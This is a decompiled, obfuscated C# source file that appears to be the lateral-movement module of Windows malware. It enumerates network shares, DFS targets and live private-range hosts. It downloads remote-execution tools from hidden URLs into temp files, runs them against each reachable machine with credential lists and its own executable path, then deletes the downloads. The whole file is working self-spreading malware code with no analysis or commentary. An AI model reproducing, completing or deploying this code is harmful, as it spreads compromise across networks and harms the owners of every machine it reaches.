using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KXfHkplBSblOeZ;

internal sealed class GptWEElvInK
{
	public sealed class JaHXTlStBqe
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum YIUAYjcffmhySp
	{
		xWcQQaOmaJhI = 1,
		fUsKgObpYpZCxC,
		jceFPxuMTfClh,
		wfkQhGHqCQVSNL,
		neaKHwvTlsGAl
	}

	public enum mHqNBNPTlfVSk
	{
		lWnjhvAnSus,
		UILdYYMlQZrZS,
		NsXcQYHncAJCc,
		BjGPNOgxSU
	}

	public enum zcnsGiELoVFwHj
	{
		YbwQzykpSCFvzX = 1,
		aGIIPDPFpyItBtA = 2,
		CrVdykrBVpmdar = 4,
		footxfdOBQx = 8,
		WyKNdQExzbLf = 16,
		TdEHeGPvmei = 19
	}

	public enum olQVuoIZfz
	{
		RiVyYlYFEDWKU,
		zsInbdnesMAkM,
		TgmWAgGegLRbza,
		REZFNBsHUPc,
		iwmrPtOndoRliOb,
		dWuGmXJaagzFdPK,
		czUkrqxUsQY,
		zFoovTygqHNTVs,
		kAtZaMUoayzTB,
		xMuLBdcASgFEt,
		YBgMnYsmXQEAwF,
		KnpgwrVRVTaGvV
	}

	public sealed class EcjplzzhQSG : IEnumerable
	{
		private enum FuiEVhpcDQBk
		{
			pGbTjVlPTB = 0,
			rMHonhMGbfJe = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class TDOPwkyZzr
		{
			public YIUAYjcffmhySp ITLJTCcDLpcKD;

			public mHqNBNPTlfVSk AaqrEsvSXV;

			public olQVuoIZfz QNZgDcndftQ;

			public zcnsGiELoVFwHj IFPVJsCmeZCXxqBA;

			public string wiWkIYCoGExLJah;

			public string xZXwaqpPiLJ;

			public string VnhzQIxbvWtOe;

			public string evoiGQSoSrcRb;
		}

		private ArrayList LamNLWaMfbG = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern FuiEVhpcDQBk WNetOpenEnumA(YIUAYjcffmhySp dwScope, mHqNBNPTlfVSk dwType, zcnsGiELoVFwHj dwUsage, TDOPwkyZzr p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern FuiEVhpcDQBk WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern FuiEVhpcDQBk WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(TDOPwkyZzr tdopwkyZzr_0, YIUAYjcffmhySp yiuayjcffmhySp_0, mHqNBNPTlfVSk mHqNBNPTlfVSk_0, zcnsGiELoVFwHj zcnsGiELoVFwHj_0, olQVuoIZfz olQVuoIZfz_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(yiuayjcffmhySp_0, mHqNBNPTlfVSk_0, zcnsGiELoVFwHj_0, tdopwkyZzr_0, out lphEnum) == FuiEVhpcDQBk.pGbTjVlPTB)
			{
				FuiEVhpcDQBk fuiEVhpcDQBk;
				do
				{
					fuiEVhpcDQBk = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (fuiEVhpcDQBk)
					{
					case FuiEVhpcDQBk.rMHonhMGbfJe:
						continue;
					case FuiEVhpcDQBk.pGbTjVlPTB:
						Marshal.PtrToStructure(intPtr, tdopwkyZzr_0);
						if (tdopwkyZzr_0.QNZgDcndftQ == olQVuoIZfz_0)
						{
							LamNLWaMfbG.Add(tdopwkyZzr_0.xZXwaqpPiLJ);
						}
						if ((tdopwkyZzr_0.IFPVJsCmeZCXxqBA & zcnsGiELoVFwHj.aGIIPDPFpyItBtA) == zcnsGiELoVFwHj.aGIIPDPFpyItBtA)
						{
							EnumerateServers(tdopwkyZzr_0, yiuayjcffmhySp_0, mHqNBNPTlfVSk_0, zcnsGiELoVFwHj_0, olQVuoIZfz_0);
						}
						continue;
					}
					break;
				}
				while (fuiEVhpcDQBk != FuiEVhpcDQBk.rMHonhMGbfJe);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public EcjplzzhQSG(YIUAYjcffmhySp yiuayjcffmhySp_0, mHqNBNPTlfVSk mHqNBNPTlfVSk_0, zcnsGiELoVFwHj zcnsGiELoVFwHj_0, olQVuoIZfz olQVuoIZfz_0)
		{
			TDOPwkyZzr tdopwkyZzr_ = new TDOPwkyZzr();
			EnumerateServers(tdopwkyZzr_, yiuayjcffmhySp_0, mHqNBNPTlfVSk_0, zcnsGiELoVFwHj_0, olQVuoIZfz_0);
		}

		public IEnumerator GetEnumerator()
		{
			return LamNLWaMfbG.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ytMfrJTDQZy
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string IbGQfOMyLqQXuLl;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string bxcYRmcewemmDmJ;

		public uint NrUFkaYMXXELq;

		public uint FKVEsJQUbMhoTn;

		public IntPtr KsmCjpmuORTs;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct tUUTgiRKNsPjb
	{
		public int NrUFkaYMXXELq;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string GYkGLHofswKM;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string CXrkFqdfYznxa;
	}

	public struct LpCEJnkYOyiTspEy
	{
		public string pIqDndNchxiv;

		public string[] YeiquMSFRQLL;

		public LpCEJnkYOyiTspEy(string string_0, string[] string_1)
		{
			pIqDndNchxiv = string_0;
			YeiquMSFRQLL = string_1;
		}
	}

	private sealed class BaDQIkFmMtNoh
	{
		public string tHiGKJqhtjgfnMK;

		public string ZjQhDARJboTOWoT;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107392366)) && !string_0.StartsWith(getString_0(107392361)) && !string_0.StartsWith(getString_0(107392320)) && !string_0.Contains(getString_0(107393314))) || !MCTTpXjUfWbUuA(string_0))
			{
				return;
			}
			try
			{
				if (NiISdmMYRfnXGiX.RzBNrFuKFlhr == getString_0(107396981))
				{
					for (int i = 0; i < GffEwGSOvO.Count; i++)
					{
						NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(getString_0(107392307), getString_0(107392326) + string_0 + getString_0(107406364) + GffEwGSOvO[i] + getString_0(107392296) + ZWHOtNXIkEdggdIi[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(getString_0(107392307), getString_0(107392326) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (NiISdmMYRfnXGiX.RzBNrFuKFlhr == getString_0(107396981))
			{
				for (int j = 0; j < GffEwGSOvO.Count; j++)
				{
					if (NiISdmMYRfnXGiX.kaYXkHHFquKVslEia)
					{
						if (File.Exists(tHiGKJqhtjgfnMK))
						{
							NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(tHiGKJqhtjgfnMK, getString_0(107392389) + string_0 + getString_0(107405991) + GffEwGSOvO[j] + getString_0(107405950) + ZWHOtNXIkEdggdIi[j] + getString_0(107405941) + Assembly.GetEntryAssembly()!.Location + getString_0(107392659));
						}
					}
					else if (File.Exists(ZjQhDARJboTOWoT))
					{
						NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(ZjQhDARJboTOWoT, getString_0(107392389) + string_0 + getString_0(107405991) + GffEwGSOvO[j] + getString_0(107405950) + ZWHOtNXIkEdggdIi[j] + getString_0(107405908) + Assembly.GetEntryAssembly()!.Location + getString_0(107392659));
					}
				}
			}
			else if (NiISdmMYRfnXGiX.kaYXkHHFquKVslEia)
			{
				if (File.Exists(tHiGKJqhtjgfnMK))
				{
					NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(tHiGKJqhtjgfnMK, getString_0(107392389) + string_0 + getString_0(107405851) + Assembly.GetEntryAssembly()!.Location + getString_0(107392659));
				}
			}
			else if (File.Exists(ZjQhDARJboTOWoT))
			{
				NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(ZjQhDARJboTOWoT, getString_0(107392389) + string_0 + getString_0(107405818) + Assembly.GetEntryAssembly()!.Location + getString_0(107392659));
			}
		}

		static BaDQIkFmMtNoh()
		{
			Strings.CreateGetStringDelegate(typeof(BaDQIkFmMtNoh));
		}
	}

	private sealed class GbdiFbsiPxMWw
	{
		public string RsSgqLpOPqSEk;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != RsSgqLpOPqSEk;
		}
	}

	public static List<string> UDNCAWgoDjg;

	public static string zWlnVfgsQUoq;

	public static List<string> GffEwGSOvO;

	public static List<string> ZWHOtNXIkEdggdIi;

	public static List<string> BWIlvAyNwVj;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<JaHXTlStBqe> gqMIRXJIyyPlGSH()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397256);
			process.StartInfo.Arguments = getString_0(107406463);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<JaHXTlStBqe> list = new List<JaHXTlStBqe>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107406478))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new JaHXTlStBqe
						{
							ServerName = getString_0(107397261) + stringBuilder.ToString() + getString_0(107392234)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string dGlfnCwCykIwZdbP, int CJpbsCIQpiOE, int cXjFnzXsBrfYt, out IntPtr EBMlCeHyVlxKBqo, [MarshalAs(UnmanagedType.I4)] out int YWPTvojWNrTNUdQU, [MarshalAs(UnmanagedType.I4)] ref int xLVUGGYJaRxZ);

	public static List<LpCEJnkYOyiTspEy> ThLXnbqDkJS(string string_0)
	{
		try
		{
			List<LpCEJnkYOyiTspEy> list = new List<LpCEJnkYOyiTspEy>();
			IntPtr EBMlCeHyVlxKBqo = default(IntPtr);
			int YWPTvojWNrTNUdQU = 0;
			int xLVUGGYJaRxZ = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out EBMlCeHyVlxKBqo, out YWPTvojWNrTNUdQU, ref xLVUGGYJaRxZ) == 0)
			{
				for (int i = 0; i < YWPTvojWNrTNUdQU; i++)
				{
					ytMfrJTDQZy ytMfrJTDQZy = (ytMfrJTDQZy)Marshal.PtrToStructure(EBMlCeHyVlxKBqo + i * Marshal.SizeOf(typeof(ytMfrJTDQZy)), typeof(ytMfrJTDQZy));
					if (ytMfrJTDQZy.IbGQfOMyLqQXuLl == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < ytMfrJTDQZy.FKVEsJQUbMhoTn; j++)
					{
						IntPtr ptr = new IntPtr(ytMfrJTDQZy.KsmCjpmuORTs.ToInt64() + j * Marshal.SizeOf(typeof(tUUTgiRKNsPjb)));
						tUUTgiRKNsPjb tUUTgiRKNsPjb = (tUUTgiRKNsPjb)Marshal.PtrToStructure(ptr, typeof(tUUTgiRKNsPjb));
						if (tUUTgiRKNsPjb.NrUFkaYMXXELq == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107392332),
								tUUTgiRKNsPjb.GYkGLHofswKM,
								tUUTgiRKNsPjb.CXrkFqdfYznxa
							}));
						}
					}
					string text = ytMfrJTDQZy.IbGQfOMyLqQXuLl.Replace(string_0, getString_0(107393257));
					if (text.StartsWith(getString_0(107397261)))
					{
						text = text.Substring(1);
					}
					list.Add(new LpCEJnkYOyiTspEy(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void JeeZzHoryCP()
	{
		NiISdmMYRfnXGiX.IxgZHDLTHUruQ(getString_0(107406401));
		List<JaHXTlStBqe> list = gqMIRXJIyyPlGSH();
		List<LpCEJnkYOyiTspEy> list2 = ThLXnbqDkJS(Environment.MachineName);
		if (list2 != null)
		{
			foreach (LpCEJnkYOyiTspEy item in list2)
			{
				string[] yeiquMSFRQLL = item.YeiquMSFRQLL;
				foreach (string text in yeiquMSFRQLL)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (NiISdmMYRfnXGiX.RzBNrFuKFlhr == getString_0(107396924))
						{
							for (int j = 0; j < GffEwGSOvO.Count; j++)
							{
								NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(getString_0(107392250), getString_0(107406348) + text + getString_0(107406307) + GffEwGSOvO[j] + getString_0(107392239) + ZWHOtNXIkEdggdIi[j]);
							}
						}
						else
						{
							NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(getString_0(107392250), getString_0(107406348) + text);
						}
						NiISdmMYRfnXGiX.vaSLUTUbjeY.Add(text.Replace(getString_0(107392295), getString_0(107393257)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (JaHXTlStBqe item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (NiISdmMYRfnXGiX.RzBNrFuKFlhr == getString_0(107396924))
				{
					for (int k = 0; k < GffEwGSOvO.Count; k++)
					{
						NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(getString_0(107392250), getString_0(107406348) + item2.ServerName + getString_0(107406307) + GffEwGSOvO[k] + getString_0(107392239) + ZWHOtNXIkEdggdIi[k]);
					}
				}
				else
				{
					NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(getString_0(107392250), getString_0(107406348) + item2.ServerName);
				}
				NiISdmMYRfnXGiX.vaSLUTUbjeY.Add(item2.ServerName.Replace(getString_0(107392295), getString_0(107393257)));
			}
			catch
			{
			}
		}
	}

	public static void tgoQrdgpZFHkZtd()
	{
		BaDQIkFmMtNoh CS_0024_003C_003E8__locals0 = new BaDQIkFmMtNoh();
		NiISdmMYRfnXGiX.RllSmpqvVD();
		List<puGvsBgsJUxcF> list = puGvsBgsJUxcF.qiFQbmWGuNFTOJj();
		foreach (puGvsBgsJUxcF item in list)
		{
			UDNCAWgoDjg.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK = getString_0(107393257);
		CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT = getString_0(107393257);
		try
		{
			CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK = QINTWDGmelr();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT = byPYlEHUhqg();
		}
		catch
		{
		}
		foreach (puGvsBgsJUxcF item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107392309)) || item2.IPAddress.StartsWith(getString_0(107392304)) || item2.IPAddress.StartsWith(getString_0(107392263)) || item2.IPAddress.Contains(getString_0(107393257)))
				{
					zRLLMEuSxo.jkUasqFbfzQVl(item2.MacAddress, item2.IPAddress, getString_0(107406326));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(UDNCAWgoDjg, delegate(string string_0)
			{
				if ((string_0.StartsWith(BaDQIkFmMtNoh.getString_0(107392366)) || string_0.StartsWith(BaDQIkFmMtNoh.getString_0(107392361)) || string_0.StartsWith(BaDQIkFmMtNoh.getString_0(107392320)) || string_0.Contains(BaDQIkFmMtNoh.getString_0(107393314))) && MCTTpXjUfWbUuA(string_0))
				{
					try
					{
						if (NiISdmMYRfnXGiX.RzBNrFuKFlhr == BaDQIkFmMtNoh.getString_0(107396981))
						{
							for (int i = 0; i < GffEwGSOvO.Count; i++)
							{
								NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(BaDQIkFmMtNoh.getString_0(107392307), BaDQIkFmMtNoh.getString_0(107392326) + string_0 + BaDQIkFmMtNoh.getString_0(107406364) + GffEwGSOvO[i] + BaDQIkFmMtNoh.getString_0(107392296) + ZWHOtNXIkEdggdIi[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(BaDQIkFmMtNoh.getString_0(107392307), BaDQIkFmMtNoh.getString_0(107392326) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (NiISdmMYRfnXGiX.RzBNrFuKFlhr == BaDQIkFmMtNoh.getString_0(107396981))
					{
						for (int j = 0; j < GffEwGSOvO.Count; j++)
						{
							if (NiISdmMYRfnXGiX.kaYXkHHFquKVslEia)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK))
								{
									NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK, BaDQIkFmMtNoh.getString_0(107392389) + string_0 + BaDQIkFmMtNoh.getString_0(107405991) + GffEwGSOvO[j] + BaDQIkFmMtNoh.getString_0(107405950) + ZWHOtNXIkEdggdIi[j] + BaDQIkFmMtNoh.getString_0(107405941) + Assembly.GetEntryAssembly()!.Location + BaDQIkFmMtNoh.getString_0(107392659));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT))
							{
								NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT, BaDQIkFmMtNoh.getString_0(107392389) + string_0 + BaDQIkFmMtNoh.getString_0(107405991) + GffEwGSOvO[j] + BaDQIkFmMtNoh.getString_0(107405950) + ZWHOtNXIkEdggdIi[j] + BaDQIkFmMtNoh.getString_0(107405908) + Assembly.GetEntryAssembly()!.Location + BaDQIkFmMtNoh.getString_0(107392659));
							}
						}
					}
					else if (NiISdmMYRfnXGiX.kaYXkHHFquKVslEia)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK))
						{
							NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK, BaDQIkFmMtNoh.getString_0(107392389) + string_0 + BaDQIkFmMtNoh.getString_0(107405851) + Assembly.GetEntryAssembly()!.Location + BaDQIkFmMtNoh.getString_0(107392659));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT))
					{
						NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT, BaDQIkFmMtNoh.getString_0(107392389) + string_0 + BaDQIkFmMtNoh.getString_0(107405818) + Assembly.GetEntryAssembly()!.Location + BaDQIkFmMtNoh.getString_0(107392659));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK))
			{
				File.Delete(CS_0024_003C_003E8__locals0.tHiGKJqhtjgfnMK);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT))
			{
				File.Delete(CS_0024_003C_003E8__locals0.ZjQhDARJboTOWoT);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string QINTWDGmelr()
	{
		if (IntPtr.Size == 8)
		{
			return TozxbXDiCYXGyz(new Uri(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107406273))));
		}
		return TozxbXDiCYXGyz(new Uri(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107406273))));
	}

	public static string byPYlEHUhqg()
	{
		if (IntPtr.Size == 8)
		{
			return TozxbXDiCYXGyz(new Uri(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107405712))));
		}
		return TozxbXDiCYXGyz(new Uri(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107405603))));
	}

	public static bool MCTTpXjUfWbUuA(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string TozxbXDiCYXGyz(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107405530), getString_0(107393257)).Remove(0, 3) + getString_0(107405557);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> ZbriLKwnXXXFNM()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107405548));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107405483)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107405950));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				GbdiFbsiPxMWw CS_0024_003C_003E8__locals0 = new GbdiFbsiPxMWw();
				CS_0024_003C_003E8__locals0.RsSgqLpOPqSEk = array4[j];
				if (CS_0024_003C_003E8__locals0.RsSgqLpOPqSEk.Contains(getString_0(107405969)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.RsSgqLpOPqSEk).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static GptWEElvInK()
	{
		Strings.CreateGetStringDelegate(typeof(GptWEElvInK));
		UDNCAWgoDjg = new List<string>();
		zWlnVfgsQUoq = getString_0(107393257);
		GffEwGSOvO = new List<string>
		{
			getString_0(107405964),
			getString_0(107393257)
		};
		ZWHOtNXIkEdggdIi = new List<string>
		{
			getString_0(107405915),
			getString_0(107393257)
		};
		BWIlvAyNwVj = new List<string>();
	}
}
